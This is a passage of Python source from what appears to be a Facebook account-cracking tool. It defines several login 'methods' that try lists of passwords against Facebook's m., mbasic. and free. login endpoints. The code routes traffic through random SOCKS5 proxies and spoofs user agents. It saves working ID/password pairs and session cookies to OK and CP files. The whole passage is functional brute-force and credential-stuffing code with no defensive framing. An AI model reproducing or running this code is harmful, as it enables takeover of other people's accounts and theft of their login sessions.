					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METHOD REGULER ]--------------------#
def reguler1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def reguler2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
			
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def reguler3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'free.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://free.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://free.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METODE ASYNC ]--------------------#
def kontol(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}

			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METODE B-API ]--------------------#
def bapi(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}B-Api{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
